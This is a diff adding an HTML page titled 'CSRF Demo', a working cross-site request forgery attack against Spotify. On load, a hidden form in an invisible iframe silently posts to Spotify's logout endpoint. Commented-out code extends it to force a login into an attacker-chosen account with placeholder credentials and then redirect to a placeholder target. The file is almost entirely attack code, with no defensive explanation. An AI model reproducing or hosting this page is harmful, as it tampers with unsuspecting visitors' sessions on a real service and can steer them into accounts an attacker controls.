@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Demo</title>
+</head>
+<body>
+  <div style="display:none">
+    <iframe style="display:none" name="csrf-frame"></iframe>
+
+    <form method='POST' id="logoutForm" action='https://open.spotify.com/logout' target="csrf-frame">
+      <input type='submit' value='submit'>
+    </form>
+
+    <!--<form method='POST' id="loginForm" action='https://open.spotify.com/login' target="csrf-frame">
+      <input type='hidden' name='username' value='<user_name>'>
+      <input type='hidden' name='password' value='<password>'>
+      <input type='submit' value='submit'>
+    </form>-->
+  </div>
+
+  <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript">
+    $(document).ready(function() {
+      logout();
+      // login();
+      // redirect();
+    });
+
+    function logout() {
+      console.log('Current user logged out');
+      $('#logoutForm').submit();
+    }
+
+    function login() {
+      console.log('Fake user logged in');
+      $('#loginForm').submit();
+    }
+
+    function redirect() {
+      setTimeout(() => {
+        window.location.href = "<target_url>";
+      }, 3000)
+    }
+  </script>
+</body>
+</html>
